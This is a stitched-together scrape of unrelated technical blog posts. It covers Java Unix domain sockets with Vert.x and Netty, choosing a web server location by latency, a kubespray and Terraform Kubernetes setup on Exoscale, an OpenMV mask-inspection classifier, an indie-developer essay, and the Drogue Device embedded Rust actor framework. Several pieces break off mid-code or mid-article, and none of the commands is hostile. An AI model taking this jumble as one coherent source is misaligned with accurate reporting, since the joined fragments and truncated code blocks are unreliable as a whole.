<div>
<div>
<pre><code>java.lang.UnsupportedOperationException: Not supported
  at java.base/sun.nio.ch.SocketChannelImpl.socket(SocketChannelImpl.java:226)
  at dev.morling.demos.PostgresUnixDomainSocketFactory.createSocket(PostgresUnixDomainSocketFactory.java:17)</code></pre>
</div>
</div>
<p>Indeed it looks like JEP 380 is concerning itself only with the non-blocking <code>SocketChannel</code> API,
while users of the blocking <code>Socket</code> API do not get to benefit from it.
It should be possible to create a custom <code>Socket</code> implementation based on the socket channel support of JEP 380,
but that’s going beyond the scope of my little exploration.</p>
</div>
</div>
<div>
<h2 id="_the_vert_x_postgres_client">The Vert.x Postgres Client</h2>
<div>
<p>If the Postgres JDBC driver doesn’t easily benefit from the JEP,
what about other Java Postgres clients then?
There are several non-blocking options,
including the <a href="https://vertx.io/docs/vertx-pg-client/java/">Vert.x Postgres client</a> and <a href="https://github.com/pgjdbc/r2dbc-postgresql">R2DBC</a>.
The former is used to bring Reactive capabilities for Postgres into the Quarkus stack, too,
so I turned my attention to it.</p>
<p>Now the Vert.x Postgres Client already has support for Unix domain sockets,
by means of adding the right Netty native transport dependency to your project.
So purely from functionality perspective, there’s not that much to be gained here.
But being able to use domain sockets also with the default NIO transport would still be nice,
as it means one less dependency to take care of.
So I dug a bit into the code of the Postgres client and Vert.x itself and figured out, that two things needed adjustment:</p>
<div>
<ul>
<li>
<p>The NIO-based <a href="https://github.com/eclipse-vertx/vert.x/blob/master/src/main/java/io/vertx/core/net/impl/transport/Transport.java"><code>Transport</code></a> class of Vert.x needs to learn about the fact that <code>SocketChannel</code> now also supports Unix domain sockets (currently, an exception is raised when trying to use them without a Netty native transport)</p>
</li>
<li>
<p>Netty’s <a href="https://github.com/netty/netty/blob/4.1/transport/src/main/java/io/netty/channel/socket/nio/NioSocketChannel.java"><code>NioSocketChannel</code></a> needs some small changes, as it tries to obtain a <code>Socket</code> from the underlying <code>SocketChannel</code>, which doesn’t work for domain sockets as we’ve seen above</p>
</li>
</ul>
</div>
<p>Step 1 was quickly done by creating a custom sub-class of the default <code>Transport</code> class.
Two methods needed changes:
<code>channelFactory()</code> for obtaining a factory for the actual Netty transport channel,
and <code>convert()</code> for converting a Vert.x <code>SocketAddress</code> into a NIO one:</p>

</div>
<p>Now let’s take a look at the <code>UnixDomainSocketChannel</code> class.
I was hoping to get away again with creating a sub-class of the NIO-based implementation,
<code>io.netty.channel.socket.nio.NioSocketChannel</code> in this case.
Unfortunately, though, the <code>NioSocketChannel</code> constructor invokes the taboo <code>SocketChannel#socket()</code> method.
Of course that’d not be a problem when doing this change in Netty itself,
but for my little exploration I ended up copying the class and doing the required adjustments in that copy.
I ended up doing two small changes:</p>
<div>
<ul>
<li>
<p>Avoiding the call to <code>SocketChannel#socket()</code> in the constructor:</p>
<div>
<div>
<pre><code data-lang="java"><span>public</span> <span>UnixDomainSocketChannel</span><span>(</span><span>Channel</span> <span>parent</span><span>,</span> <span>SocketChannel</span> <span>socket</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span><span>parent</span><span>,</span> <span>socket</span><span>);</span>
    <span>config</span> <span>=</span> <span>new</span> <span>NioSocketChannelConfig</span><span>(</span><span>this</span><span>,</span> <span>new</span> <span>Socket</span><span>());</span> <i data-value="1"></i><b>(1)</b>
<span>}</span></code></pre>
</div>
</div>
<div>
<table>
<tbody><tr>
<td><i data-value="1"></i><b>1</b></td>
<td>Passing a dummy socket instead of <code>socket.socket()</code>, it shouldn’t be accessed in our case anyways</td>
</tr>
</tbody></table>
</div>
</li>
<li>
<p>A few methods call the <code>Socket</code> methods <code>isInputShutdown()</code> and <code>isOutputShutdown()</code>;
those should be possible to be by-passed by keeping track of the two shutdown flags ourselves</p>
</li>
<li>
<p>As I was creating the <code>UnixDomainSocketChannel</code> in my own namespace instead of Netty’s packages,
a few references to the non-public method <code>NioChannelOption#getOptions()</code> needed commenting out,
which again shouldn’t be relevant for the domain socket case</p>
</li>
</ul>
</div>
<p>You can find the complete change in <a href="https://github.com/gunnarmorling/unix-domain-socket-poc/commit/9d8502f5c47cb59162e325640db54672f1ed8b68">this commit</a>.
All in all, not exactly an artisanal piece of software engineering,
but the little hack seemed good enough at least for taking a quick glimpse at the new domain socket support.
Of course a real implementation could be done much more properly within the Netty project itself.</p>
<p>So it was time to give this thing a test ride.
As we need to configure the custom <code>Transport</code> implementation,
retrieval of a <code>PgPool</code> instance is a tad more verbose than usual:</p>
<div>
<div>
<pre><code data-lang="java"><span>PgConnectOptions</span> <span>connectOptions</span> <span>=</span> <span>new</span> <span>PgConnectOptions</span><span>()</span>

            <p>February 2021</p>
            <p id="article-description">Using my own web server accesslogs and public
            latency data to get a quantitative answer and why roundtrips are such a
            pain.</p>
            <figure>
                <img src="http://calpaterson.com/assets/network-transit-times.svg" alt="...">
                <figcaption>
                    <p>As network latencies grow, strange things can happen: "fat"
                    sites can become fast (especially if served completely from CDN)
                    and "thin" sites that use APIs can become slow. A typical latency
                    for a desktop/laptop user is 200ms, for a 4G mobile user,
                    300-400ms.</p>
                    <p>I've assumed <a href="https://www.statista.com/statistics/896779/average-mobile-fixed-broadband-download-upload-speeds/">
                    40 megabit bandwidth</a>, TLS, latency to CDN of <a href="https://blog.apnic.net/2019/08/28/analysing-global-cdn-performance/">
                    40ms</a> and no existing connections.</p>
                    <p>"Origin" here means the primary webserver (as opposed to "edge"
                    CDN caches).</p>
                </figcaption>
            </figure>
            <p>What's the fastest place to put my server? Beyond the time taken for
            servers to respond to requests it takes time just to traverse the internet,
            just to get a packet from A to B.</p>
            <p>To estimate what the theoretical best physical place to put my own
            server is I've combined publicly available data on latencies with my own
            web server accesslogs. I'm aiming to get a rough, quantitative, answer
            that's based on a real data set.</p>
            <h2>Why location matters</h2>
            <p>Time taken to traverse the internet is added to the time taken to
            respond to a request. Even if your API can respond to a request in 1ms, if
            the user is in London and your API server is in California the user still
            has to wait ~130 milliseconds for the response.</p>
            <p>It's a bit worse than just 130 milliseconds. Depending on what a user is
            doing they may end up making a number of those roundtrips. To download a
            web page usually requires five full roundtrips: one to resolve the domain
            name via DNS, one to establish the TCP connection, two more to set up an
            encrypted session with TLS and one, finally, for the page you wanted in the
            first place.</p>
            <p>Subsequent requests <em>can</em> (but don't always) reuse the DNS, TCP
            and TLS setup but a new roundtrip is still needed each time the server is
            consulted, for example for an API call or a new page.</p>
            <p>130ms sounded fast at first, but the rigmarole of just getting a page
            and then making an couple of API calls can easily end up taking most of a
            second just in terms of time waiting for the network. All the other time
            required: for the server to decide what response to send to your request,
            time downloading the thing and then rendering whatever it is in your
            browser - that is all extra.</p>
            <h3>The two kinds of "fast" for networks</h3>
            <p>One of the confusing things about networking is the inspecific way in
            which people talk of getting "faster" networking: "faster" residental
            broadband for example, or <a href="https://en.wikipedia.org/wiki/Fast_Ethernet">"fast ethernet"</a> (100
            megabits per second, no longer impressive).</p>
            <p>This kind of "faster" is not in fact talking about speed. Greater speed
            would be reduced latency - so faster roundtrips. Instead "faster"
            networking is really about <em>greater bandwidth</em>: more bytes per
            second.</p>
            <h3>APIs or CDNs</h3>
            <p>One thing that does make things faster: a Content Distribution Network
            (or CDN). Instead of going all the way to California perhaps you can
            retrieve some of the web page from a cache in central London. Doing this
            saves time - perhaps taking just 50 milliseconds, a saving of 60%. Caches
            work great for CSS files, images and javascript - stuff that doesn't change
            for each user. It doesn't work as well for the responses to API calls, for
            which the responses are different for each user, and sometimes, each
            time.</p>
            <h2>A quantitative approach</h2>
            <p>A happy few can serve everything from their CDN. News sites, for
            example, show the exact same thing to everyone. Others are less lucky and
            can make only limited, or no, use of caching. These poor people have to
            pick a location for their main server to help them get their bytes to the
            users who want them as fast as possible. If they want to make that choice
            with the sole aim of reducing latency, where should they pick?</p>
            <p>Here's what I did:</p>
            <ol>
                <li>I took my own accesslogs for a two week period in September just
                after I'd published something new. I got about a million requests
                during this period from 143k unique IPs. I excluded obvious robots
                (which was ~10% of requests).</li>
                <li>I used Maxmind's GeoIP database to geocode each IP address in those
                accesslogs to geographic co-ordinates.</li>
                <li>I then used <a href="https://wondernetwork.com/pings">WonderNetwork's published latency
                data</a> for internet latencies between ~240 world cities.
                </li>
                <li>I mapped those cities (semi-manually, which was pretty painful)
                from their names to <a href="https://www.geonames.org/">Geonames</a>
                ids - which gave me co-ordinates for the cities.
                </li>
                <li>Then I loaded all of the above into a Postgres database with the
                <a href="https://postgis.net/">PostGIS</a> extension installed so I
                could do geographical queries.
                </li>
                <li>I queried to estimate how long, by percentile, requests would have
                taken if I'd had my server in each of the 200 cities.</li>
            </ol>
            <h2>The results</h2>
            <p>In the table below I've recorded the outcome: how long users would take
            to complete a single roundtrip to my server if it were in each city. I've
            done this by percentiles so you have:</p>
            <ul>
                <li>the average ("p50")</li>
                <li>for three quarters of requests ("p75")</li>
                <li>and for 99% of requests ("p99")</li>
            </ul>
            <p>All numbers are in milliseconds.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><div data-elementor-type="wp-post" data-elementor-id="9644" data-elementor-settings="[]"><div><div><section data-id="39453a45" data-element_type="section"><div><div><div data-id="28daaf9d" data-element_type="column"><div><div><div data-id="6259e7" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>In this Elastisys Engineering blog post, we show how to set up a production-ready Kubernetes cluster on Exoscale using kubespray and Terraform. It gets a control plane and a set of worker nodes, and leverages Rook and Ceph to get Persistent Volume support.</p><h2 id="why">Why install Kubernetes using kubespray?</h2><p>The reasons why one might want to install Kubernetes “manually” are many:</p><ul><li>Allows you to run Kubernetes on cloud providers even if they do not offer a managed Kubernetes service such as AKS, EKS, or GKE.</li><li>Not entangled with the cloud provider’s IAM or other services, which makes a multi-cloud strategy easier to implement in practice. This way, your tools and processes will not be cloud-vendor specific.</li><li>Allows full control over the control plane: if you want to install, e.g., an OpenID Connect provider such as Dex to integrate with your Identity Provider (IdP), you can. With a managed service, what you can or cannot do is at the mercy of your cloud provider.</li></ul><p>So let’s get to it!</p><h2 id="requirements">Requirements</h2><p>Our cluster setup is as following:</p><ul><li>One control plane node: 2GB RAM, 2 vCPU, 50GB local storage.</li><li>Three worker nodes: 8GB RAM, 4 vCPU, 100GB local storage each.</li></ul><p>All nodes are running Ubuntu 20.04 LTS. The cluster is running Kubernetes v1.19.7 and is installed using kubespray 2.15.0. You will also need Terraform to follow along with this guide.</p><h2 id="infrastructure">Infrastructure</h2><p>The first thing that is needed is to set up all the infrastructure needed for the cluster.</p><h3 id="terraform">Terraform</h3><p>The easiest way to deploy a production-ready Kubernetes cluster is to use the Terraform script from <a href="https://github.com/kubernetes-sigs/kubespray" target="_blank" rel="noopener">kubespray</a></p><p>Clone kubespray for the script. Exoscale support is on master right now.</p><pre><code>git clone https://github.com/kubernetes-sigs/kubespray.git
cd kubespray<br></code></pre><p>Create a new folder in the inventory folder for your cluster.</p><pre><code>CLUSTER=my-exoscale-cluster
cp -r inventory/sample inventory/$CLUSTER
cp contrib/terraform/exoscale/default.tfvars inventory/$CLUSTER/
cd inventory/$CLUSTER</code></pre><p>Edit <code>default.tfvars</code> and make sure that <code>ceph_partition_size</code> for all the workers is set to 50. <em>(To match the reference setup)</em></p><p>For authentication you can use a encrypted credentials file ~/.cloudstack.ini or ./cloudstack.ini. This file can be created by running:</p><pre><code>cat &lt;&lt; EOF &gt; cloudstack.ini
[cloudstack]
key = 
secret = 
EOF
sops --encrypt --in-place --pgp  cloudstack.ini
sops cloudstack.ini</code></pre><p>Insert your API key in <code>key</code> and API secret in <code>secret</code>. Follow the <a href="https://community.exoscale.com/documentation/iam/quick-start/" target="_blank" rel="noopener">Exoscale IAM Quick-start</a> to learn how to generate API keys.</p><p>To create the cluster, run the following and follow the instructions on the screen.</p><pre><code>terraform init ../../contrib/terraform/exoscale
sops exec-file -no-fifo cloudstack.ini 'CLOUDSTACK_CONFIG={} terraform apply -var-file default.tfvars ../../contrib/terraform/exoscale'</code></pre><p>You should now have a inventory file <code>inventory.ini</code> that you can use with kubespray. To test it and to make sure that all the nodes are properly up and running, run the following:</p><pre><code>ansible -i inventory.ini -m ping all</code></pre><h3 id="other-setup">Other setup</h3><p>If you are setting up the nodes by yourself, please keep in mind that Exoscale at the time of writing doesn’t have support for adding additional disks. Therefore you need to split the root disk into multiple partitions.</p><p>This can be achieved by making sure that your instance has more than 50GB of disk and that the following lines is added to your user-data before booting.</p><pre><code>#cloud-config
bootcmd:
- [ cloud-init-per, once, move-second-header, sgdisk, --move-second-header, /dev/vda ]
- [ cloud-init-per, once, create-ceph-part, parted, --script, /dev/vda, 'mkpart 2 50GB -1' ] # Create ceph partition spanning from 50GB from start to end</code></pre><p>More information about this can be found in this blog post, <a href="https://elastisys.com/elastisys-engineering-how-to-set-up-rook-with-ceph-on-kubernetes/" target="_blank" rel="noopener">Rook Ceph on Kubernetes</a>.</p><h3 id="kubespray">kubespray</h3><p>When the infrastructure is up and running, it’s time to add Kubernetes on top of all this. If you have followed the suggested way of spinning up the infrastructure, you should be able to run:</p><pre><code>ansible-playbook -i inventory.ini ../../cluster.yml -b -v</code></pre><p><em>NOTE: You might want to set the value <code>kubeconfig_localhost</code> in the file <code>group_vars/k8s-cluster/k8s-cluster.yml</code> to <code>true</code> to get the kubeconfig file. Just remember that it will use the private IP of the server, so update the server IP to match the IP of the control plane load balancer.</em></p><p>When Ansible is finished, verify that you have access to the Kubernetes cluster by running:</p><pre><code>kubectl get nodes</code></pre><h3 id="rook">Rook</h3><p>Install rook by installing the rook operator chart.</p><pre><code>helm repo add rook-release https://charts.rook.io/release
kubectl create namespace rook-ceph
helm upgrade --install --namespace rook-ceph rook-ceph rook-release/rook-ceph --version v1.5.5 --wait

# Need to use ceph v15.2.7 to be able to use partitions

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><strong>How we built a visual COVID-19 mask quality inspection prototype running on-device on an OpenMV-H7 board and the challenges on the way.</strong></p><p>‍</p><p>TLDR; The source code to train and deploy your own image classifier can be found here: <a href="https://github.com/ARM-software/EndpointAI/tree/master/ProofOfConcepts/Vision/OpenMvMaskDefaults" target="_blank">https://github.com/ARM-software/EndpointAI/tree/master/ProofOfConcepts/Vision/OpenMvMaskDefaults</a></p><p>‍</p><p>In the summer of 2020, we worked with Arm to build an easy-to-use tutorial on how to train and deploy an image classifier on an Arm microcontroller. In this post, we show how we approached and solved the following challenges:</p><ul role="list"><li>Convert a PyTorch ResNet to TensorFlow and quantize it to use 8-bit integer values</li><li>Collect, select, and annotate data of faulty and non-faulty masks</li><li>Use self-supervised pre-training to boost model performance when working on fewer images.</li></ul><p>‍</p><h3>The Results to Expect</h3><p>The goal of this project was to show an end-to-end workflow on how to train and deploy a convolutional neural network to an OpenMV-H7 board.</p><p>The video below showcases how our classifier detects faulty masks in real-time.</p><figure id="w-node-1e0674653ff8-e7e87989"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/ba1c1JkBnNc"></iframe></p></figure><h3>The OpenMV-H7 Board</h3><p>The board consists of an <a href="https://www.st.com/en/microcontrollers/stm32h743vi.html" target="_blank">STM32H743VI</a> Arm Cortex-M7 processor running at 480MHz, multiple peripherals, and a camera module mounted on it.<br>The camera module has an <a href="http://www.ovt.com/products/sensor.php?id=80" target="_blank">OV7725</a> sensor from OmniVision and can record in VGA resolution (640x480) at 75 FPS.</p><p>Since the board has limited computing power and memory, we aimed for a very small deep learning model. We call the variant ResNet-9 since it’s more of a cut in half ResNet-18 variant. Below you can find some numbers about the model configuration, runtime, and other metrics.</p><ul role="list"><li><strong>Input size:</strong> 64x64x3 </li><li><strong>CPU Freq.:</strong> 480 MHz</li><li><strong>Operations:</strong> 33.4 MOp</li><li><strong>Model size: </strong>90 kBytes</li><li><strong>Inference Time: </strong>150 ms</li><li><strong>Operations/s</strong>: 249 MOp/s</li></ul><p>Detailed specs can be found on the official website of OpenMV <a href="https://openmv.io/products/openmv-cam-h7" target="_blank">here</a>.</p><figure id="w-node-54c1c743c46b-e7e87989"><p><img src="https://uploads-ssl.webflow.com/5f7ac1d59a6fc121dde87967/6006dd1b05a6ba9ae8de6dd0_1*tN005NiVE1kZbBK9BwCRmw.jpeg" alt=""></p><figcaption>A close-up picture of the OpenMV H7 Board we used.</figcaption></figure><h3>Data Collection</h3><p>Neural networks are very data-hungry. In order to efficiently collect enough training data we did the following:</p><ol role="list"><li>We used the camera on the OpenMV-H7 board to record video sequences. With the USB interface and the <a href="https://openmv.io/pages/download" target="_blank">OpenMV IDE</a>, we were able to easily record the camera stream and save it as a video file.</li><li>To simulate a real production line we mounted the camera on cardboard to make sure the camera is stable. The optics point to the production line which is a metal plate with tall borders. This setup ensures, that the camera sees defect and non-defect masks within the same environment.</li><li>Finally, we moved masks through our inspection line using a combination of push and pull.</li></ol><figure id="w-node-aeaf7ee059b3-e7e87989"><p><img src="https://uploads-ssl.webflow.com/5f7ac1d59a6fc121dde87967/6006dd1b93ae233273724258_1*fULWu10pKzaaYevH6g1wAw.jpeg" alt=""></p><figcaption>A picture of our data collection pipeline. We cut a small hole into the cardboard to clamp the USB table holding the board into it.</figcaption></figure><h3>Data Selection and Annotation</h3><p>At this stage we have multiple video files, each having captured a few minutes. The next challenge is to extract the frames and annotate the data. We use FFmpeg for the frame extraction and <a href="http://lightly.ai/" target="_blank">Lightly</a> to select a diverse set of frames. Note that we had more than 20k frames but no time to annotate all of them. Using <a href="http://lightly.ai/" target="_blank">Lightly</a> we selected a few hundred frames covering all relevant scenarios.<br><a href="http://lightly.ai/" target="_blank">Lightly</a> uses self-supervised learning to get good representations of the images. It then uses these representations to select the most interesting images which should be annotated. The benefit of this method is that we can access the pre-trained model and fine-tune it on only a handful of labeled images.</p><figure id="w-node-d0a8cad91e90-e7e87989"><p><img src="https://uploads-ssl.webflow.com/5f7ac1d59a6fc121dde87967/6006dd1bb94b015a4b0f3fab_1*PReJtvsyDDVwhWxQXDaI9w.jpeg" alt=""></p><figcaption>Example images taken with the OpenMV H7 camera showing the three labels for the data. From left to right: good mask, defect mask, no mask.</figcaption></figure><figure><p><img src="" alt=""></p></figure><p><strong>Model Fine-Tuning<br></strong>To prevent the model from overfitting, we simply froze the pre-trained backbone and added a linear classification head to the model. We then trained the classifier for 100 epochs on a total of 500 annotated images.</p><p>‍</p><h3>From PyTorch to Keras to TensorFlow Lite</h3><p>Moving the pre-trained PyTorch model to TensorFlow Lite turned out to be the most difficult part of our endeavor.</p><p>‍</p><p>We tried out several tricks with ONNX to export our model. A simple library called <a href="https://github.com/nerox8664/pytorch2keras" target="_blank">pytorch2keras</a> worked fine for a model only consisting of linear layers but not for our conv + linear model. </p><p>The main problem we encountered, was that PyTorch uses the CxHxW (channel, height, width) format for tensors whereas TensorFlow uses HxWxC. This meant that, after transforming our model to TensorFlow Lite, the output of the layer just before the classifier was permuted, and hence, the output of the classifier was incorrect. In order to address this problem, we considered manually permuting the weights of the linear classifier. </p><p>However, we decided to go for a simpler solution. We pooled the output of the last convolutional layer into a Cx1x1 shape. That way, changing the order of the channels does not affect the output of the neural network.</p><p>‍</p><p>The final step is to quantize and export the Keras model to TensorFlow Lite. In our case quantization reduces the model size and speeds up running the model in inference at the cost of a few percent lower accuracy.</p><p>Special thanks to our collaborators at Arm and <a href="https://medium.com/u/297b71d663f3" target="_blank">Philipp Wirth</a> from Lightly for making this project possible. The <a href="https://github.com/ARM-software/EndpointAI/tree/master/ProofOfConcepts/Vision/OpenMvMaskDefaults" target="_blank">full source code is available here</a>. You can easily train your own classifier and run it on an embedded device.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div><p>I’ve been part of the internet startup scene for a while. There are so many different camps: the bootstrappers, the VC-backed tech-bros, the crypto “investors”, the people marketing their courses on marketing courses, the newsletter gurus, the micro-saas homeboys. The list goes on.</p>
<p>Each of these groups have their own, unique views on building companies and products. Some are moonshots, others are sustainable “grow-slowly” types, and each has its own subset of hard-core, flame-war inducing followers. Ah, the internet is a beautiful, terrible, magical, ghastly, colourful place.</p>
<p>I’ve been associated with, and in some cases, been a part of a few of these various subcultures. After working at a VC backed startup, I went the bootstrapped route (popularised by the IndieHackers movement) with my own product. It was an interesting ride, but was still rife with the Marketing Course Joes who just made $3000 last week with their “How to market no-code apps” course, as well as the Hustle Boys with their Twitter feeds full of “Work like no-one works today, so you can live like no-one lives tomorrow. #entrepreneur”. Neither of these resonated with me.</p>
<p>I have found my own analogy/ideology. My product is my garden.</p>
<p>During the early days of lockdown, my girlfriend got deep into gardening. She would spend hours nurturing her tomato plants, weeding, watering, puttering about. She would spend afternoons reading articles on permaculture, figuring out which plants grew well alongside other plants. Lavender with tomatoes kept the pests away, slight shade for the granadilla vine, some water, but not too much for the root vegetables. It was lovely to watch her coax tasty and nutritious food individually out of the ground. I can’t imagine full-scale farming being nearly as enjoyable.</p>
<p>That’s what I want from my products. I want to putter about, feel connected to the process, and have fun doing so. I want to make things that don’t scale. To see people tuck into them and enjoy them as people, not as stats. I’ve done this fairly successfully with <a href="https://justsketch.me/">JustSketchMe</a>. We have a small, diverse, and amazing community of artists and illustrators making awesome things. I’m trying to build a similar product with <a href="https://bearblog.dev/">Bear Blog</a>. Something niche but valuable. Something I can spend time on because I want to.</p>
<p>Being able to talk to, and interact with the people using my tools is fulfilling. Spending time meticulously improving subtle aspects of the product is enjoyable.</p>
<p>Obviously, to do this a product has to reach a basic threshold of profitability. This will differ depending on where you are. I live in Cape Town, South Africa where the cost of living is low (compared to the US and EU). I reached basic profitability, matching an average developer salary here, about 10 months ago, and since then I’ve been improving my projects. Not to grow at all cost, but to ensure that people using the tool have an ever-improving experience.</p>
<p>This is my garden, and I intend to putter.</p>

February 3, 2021 | https://blog.drogue.io/introducing-drogue-device/ | <a href="https://web.archive.org/web/*/https://blog.drogue.io/introducing-drogue-device/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody">
          <p>Trying to bring reusable and efficient components to embedded Rust has been a challenge for our team.
We think we've started to make headway, and want to introduce the <code>Drogue Device</code> project.</p>
<span id="continue-reading"></span>
<p>A lot of embedded frameworks and RTOSs rely on procedural coding, "copy these source files into your tree" or a lot of manual connection of APIs to the runtime.
Since <em>We Are Red Hat</em> (or IBM, or more specifically/historically "JBoss"), we like reusable components. And frameworks.
They represent guardrails and provide guidance on how to build larger <em>systems</em>, we feel.</p>
<h2 id="component-systems">Component Systems</h2>
<p>In enterprise software, component systems abound. 
There's Enterprise Java Beans, Actix, CDI, Vert.x, Node.js, Akka framework, Quarkus, Spring, etc.
Many of these component systems tend to rely on multi-threading capability of the underlying system, and bring about concurrency issues, such as shared-state and locking.</p>
<h2 id="actor-systems">Actor Systems</h2>
<p>Of these systems, Akka is an <em>actor system</em>, which attempts to draw clear lines about ownership and control of state and data, helping alleviate concurrency concerns.
An actor within an actor system believes that it is single-threaded, serially processing requests that arrive which desire to operate upon the data it controls.
This seemingly single-threaded nature allows an actor to avoid locking of its data. 
All mutations occur from the POV of the actor himself, triggered by <em>message passing</em> from external sources which make requests.</p>
<h2 id="messaging">Messaging</h2>
<p>Common messaging patterns include <em>fire-and-forget</em> notifications from one component to another, and <em>request/response</em> between two components.
Sometimes components want to ambiguously broadcast messages to whichever unknown components might be interested. 
This third type is basically an <em>event bus</em>.</p>
<h2 id="task-scheduling">Task Scheduling</h2>
<p>An actor that thinks it is single-threaded is great, but our MCUs usually also only have one core, and thus one thread.
A slow actor, or one that blocks the thread of execution can bring the entire system to a halt.
Just because one actor hits a wall and can make no further progress, another actor might be able to do some meaningful work, unblocking the first.</p>
<h3 id="preemptive-task-scheduling">Preemptive Task Scheduling</h3>
<p>If you have a preemptive thread or task scheduler, then a kernel is slicing up processor time. 
An task is given a certain number of cycles (or milliseconds, or reductions or whatever unit measurement used to slice the time pie), and when the 
timer expires, the kernel forcibly pause the task and select another one to run for a slice of time.
Naive implementations will allow a blocked task to continue to block until his time-slice expires.
Other implementations allow a task to indicate that it is blocked, and relinquish any remaining time, cooperatively.</p>
<h3 id="run-to-completion-task-scheduling">Run-to-Completion Task Scheduling</h3>
<p>Some schedulers select a task, and allow it to run to completion, even if it's slow, or blocks briefly. 
The onus is on the developer to ensure his tasks will not completely halt or take too much time. 
Run-to-completion semantics can be great when you have a task you <em>absolutely</em> need to have, well, run to completion before being put into the queue to run again later.</p>
<h3 id="cooperative-task-scheduling">Cooperative Task Scheduling</h3>
<p>A cooperative task scheduler allows a task to <em>run until it can't or doesn't want to run any more</em>.
In this way, the tasks <em>must</em> cooperate. 
A task may have an infinite loop that never completes, and if he doesn't <em>pass</em> or <em>yield</em> control back, will consume 100% of the processor, 100% of the time.
This is a sub-optimal situation.
Cooperative task scheduling can be improved by language support for <em>asynchronous</em> architectures, where the language can implicitly be aware when a task can no longer make progress.
This results in the task being immediately pulled off the active queue, and another <em>ready and waiting</em> task to be selected to do some work.
This doesn't solve the tight-loop problem, where a task must still cooperatively <em>pass</em> control back to the kernel.</p>

<p>Given the above background, along with implementing an untold number of proofs-of-concept, we've selected the following key points for our system:</p>
<ul>
<li>Actor-based: State is held by an actor, accessed/mutated only by that actor, in response to messages.</li>
<li>Cooperative Scheduling: Using Rust's <code>async/await</code> support, actors attempt to be non-blocking and share the processor.</li>
<li>Message-Passing: Support <em>notifications</em>, <em>requests/responses</em>, and an <em>event-bus</em>.</li>
</ul>
<h2 id="the-actors">The Actors</h2>
<p>First, being an actor system, the primary point-of-interest is the <em>actor</em>. 
Drogue Device supports <em>two</em> flavors of actor: Plain Ol' Actors and Interrupt Actors.</p>
<h3 id="plain-ol-actors">Plain Ol' Actors</h3>
<p>The general case of an actor is a component that contains state, and can manipulate it in response to messages.
Their <em>only</em> interface with the outside world is messages. 
To ensure that no other code can directly twiddle an actor, the primary handle on an actor is an <code>Address&lt;A&gt;</code> instance.
It is through the <code>Address&lt;A&gt;</code> of an actor <code>A</code> that any part of the system can communicate with the actor.
All methods upon <code>Address&lt;A&gt;</code> are immutable, and the addresses can be freely <code>clone()</code>'d and shared around.</p>
<p>As noted above, there are two types of message interactions possible with an actor through it's <code>Address&lt;A&gt;</code>:</p>
<h4 id="notify">Notify</h4>
<pre><code data-lang="rust"><span>pub fn </span><span>notify</span><span>&lt;M&gt;(&amp;</span><span>self</span><span>, </span><span>message</span><span>: M)
</span><span>where
</span><span>    A: NotifyHandler&lt;M&gt; + </span><span>'static</span><span>,
    M: </span><span>'static</span><span>,
{
    ... elided ...
}
</span></code></pre>
<p>This signature demonstrates a few points:</p>
<ul>
<li>The system is ultimately <code>'static</code>-centric.</li>
<li>You can send a message <code>M</code> if the underlying <code>Actor</code> implements the <code>NotifyHandler&lt;M&gt;</code> trait.</li>
</ul>
<p>A <code>notify(...)</code> is a non-blocking synchronous call, meaning that it won't stop the processing and it can be called from any context, sync or async.
It ultimately enqueues the message into a FIFO for the actor. 
Some systems refer to this FIFO as the actor's "inbox".
Messages in the FIFO are indeed processed in a first-in-first-out order.
This also means that the message is <em>not</em> processed immediately upon the call of <code>notify(...)</code>.
This gives this method <em>fire and forget</em> semantics.
The actor will be mostly (see <strong>NB</strong> below)  guaranteed to eventually process the notification, at some point in the future.</p>
<p><em><strong>NB:</strong> Currently the FIFO is set to a depth of 16, and if it overflows messages will be silently discarded.
We understand this is sub-optimal. 
The intention is that once <em>const generics</em> are available in stable Rust we will allow per-actor queue depth configuration.
Additionally, we are considering how different overflow strategies may be applied per-actor.</em></p>
<p>On the <code>Actor</code> side, processing is handled through an implementation of the <code>NotifyHandler&lt;M&gt;</code> trait, for each type of message that is considered acceptable:</p>
<pre><code data-lang="rust"><span>pub struct </span><span>On;
</span><span>pub struct </span><span>Off;

</span><span>impl</span><span>&lt;P,A&gt; NotifyHandler&lt;On&gt; </span><span>for </span><span>SimpleLED&lt;P,A&gt;
</span><span>where
</span><span>    P: OutputPin,
    A: ActiveOutput,
{
    </span><span>fn </span><span>on_notify</span><span>(&amp;</span><span>'static mut </span><span>self</span><span>, </span><span>message</span><span>: On) -&gt; Completion {
        ... elided ...
    }
}

</span><span>impl</span><span>&lt;P,A&gt; NotifyHandler&lt;Off&gt; </span><span>for </span><span>SimpleLED&lt;P,A&gt;
</span><span>where
</span><span>    P: OutputPin,
    A: ActiveOutput,
{
    </span><span>fn </span><span>on_notify</span><span>(&amp;</span><span>'static mut </span><span>self</span><span>, </span><span>message</span><span>: Off) -&gt; Completion {
        ... elided ...
    }
}
</span></code></pre><h4 id="request">Request</h4>
<p>Sometimes it's useful to have a somewhat synchronous interactino with an actor in an <em>request/response</em> type of cycle.
The <code>Address&lt;A&gt;</code> type also provides that capability:</p>
<pre><code data-lang="rust"><span>pub</span><span> async </span><span>fn </span><span>request</span><span>&lt;M&gt;(&amp;</span><span>self</span><span>, </span><span>message</span><span>: M) -&gt; &lt;A as RequestHandler&lt;M&gt;&gt;::Response
</span><span>where
</span><span>    A: RequestHandler&lt;M&gt; + </span><span>'static</span><span>,
    M: </span><span>'static</span><span>,
{
    ... elided ...
}
</span></code></pre>
<p>The first thing to note is that because <code>Address&lt;A&gt;</code> is a <em>type</em> and not a <em>trait</em>, it can indeed support <code>async</code> methods.
The second thing to note is that <code>request(...)</code> <strong>is</strong> an <code>async</code> method.
Upon calling this method, a <code>Future</code> is ultimately returned, and the called <em>must</em> <code>.await</code> the response, per usual Rust async semantics.</p>
<p>It is the async nature of this method that allows actors to talk to other actors and remain non-blocking and cooperatively schedulable.</p>
<p>As with the <code>notify(...)</code> method, this method is also considered immutable, and uses the underlying actor's FIFO.
The same FIFO is shared between all types of messages that an actor can be notified or requested.</p>
